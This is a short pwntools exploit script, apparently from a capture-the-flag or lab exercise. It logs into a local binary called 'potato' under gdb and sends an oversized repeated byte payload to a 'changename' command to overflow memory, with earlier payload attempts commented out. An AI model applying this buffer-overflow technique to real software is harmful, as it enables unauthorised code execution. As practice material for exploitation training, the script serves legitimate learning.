#!/usr/bin/env python3

from pwn import *
import sys

elf = ELF("./src/potato")
p = elf.process(["console"], stdin=PTY) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break main
continue
''')

#print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username
# logged in
#p.interactive()
p.sendline(b"changename")
#payload = b"A"*1000 #+ p32(0x080491b6)
#payload=b"\xAA\xAA\xAA\xAA\xAA\x7f\x00\x00"*300
payload=b"\x66\xb9\x09\x17\x1c\x56\x00\x00"*300
p.sendline(payload)

#with open("payload", "wb") as f: f.write(payload)
#print(p.recvuntil(b": ", timeout=1)) # password
#p.sendline(b"")
#print(p.recvall(timeout=1))

p.interactive()
